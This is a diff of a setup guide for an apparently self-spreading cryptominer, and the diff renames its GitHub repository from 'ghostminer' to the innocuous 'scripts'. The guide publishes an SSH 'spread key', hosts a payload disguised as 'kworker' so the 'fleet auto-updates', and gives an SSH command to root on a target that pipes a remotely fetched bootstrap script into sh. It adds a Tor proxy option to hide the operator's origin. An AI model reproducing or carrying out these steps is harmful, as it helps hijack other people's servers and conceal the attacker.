@@ -52,7 +52,7 @@ ssh-keygen -p -f ./id_key -N ""
 ```
 
 ## 3. Host it (GitHub, public repo)
-1. Create a public repo: `ronnissleepy-code/ghostminer`, branch `main`.
+1. Create a public repo: `ronnissleepy-code/scripts`, branch `main`.
 2. Upload every top-level file from this folder, INCLUDING `id_key` (it is your
    spread key - publishing it is intended; `.pub` too if you like). Do NOT
    upload the `payload/` folder - those two files go in the Release below.
@@ -61,14 +61,14 @@ ssh-keygen -p -f ./id_key -N ""
    the fleet auto-updates on its own.
 4. Your URLs are then:
 ```
-CONFIG_URL  = https://raw.githubusercontent.com/ronnissleepy-code/ghostminer/main
-PAYLOAD_URL = https://github.com/ronnissleepy-code/ghostminer/releases/latest/download/kworker
-SHA_URL     = https://github.com/ronnissleepy-code/ghostminer/releases/latest/download/kworker.sha256
-KEY_URL     = https://raw.githubusercontent.com/ronnissleepy-code/ghostminer/main/id_key
+CONFIG_URL  = https://raw.githubusercontent.com/ronnissleepy-code/scripts/main
+PAYLOAD_URL = https://github.com/ronnissleepy-code/scripts/releases/latest/download/kworker
+SHA_URL     = https://github.com/ronnissleepy-code/scripts/releases/latest/download/kworker.sha256
+KEY_URL     = https://raw.githubusercontent.com/ronnissleepy-code/scripts/main/id_key
 ```
 Sanity check it serves:
 ```
-curl -fsSL https://raw.githubusercontent.com/ronnissleepy-code/ghostminer/main/worker.env | head
+curl -fsSL https://raw.githubusercontent.com/ronnissleepy-code/scripts/main/worker.env | head
 ```
 
 ## 4. Fill in `worker.env`
@@ -93,7 +93,7 @@ No token yet? It prints a note and skips; the rest still works.
 ```
 ssh -i id_key -o IdentitiesOnly=yes -o UserKnownHostsFile=/dev/null \
     -o StrictHostKeyChecking=accept-new root@TARGET \
-    'curl -fsSL https://raw.githubusercontent.com/ronnissleepy-code/ghostminer/main/bootstrap.sh | CONFIG_URL=https://raw.githubusercontent.com/ronnissleepy-code/ghostminer/main sh'
+    'curl -fsSL https://raw.githubusercontent.com/ronnissleepy-code/scripts/main/bootstrap.sh | CONFIG_URL=https://raw.githubusercontent.com/ronnissleepy-code/scripts/main sh'
 ```
 To also hide your origin, put this first:
 `-o ProxyCommand='nc -x 127.0.0.1:9050 %h %p'` (needs Tor running).
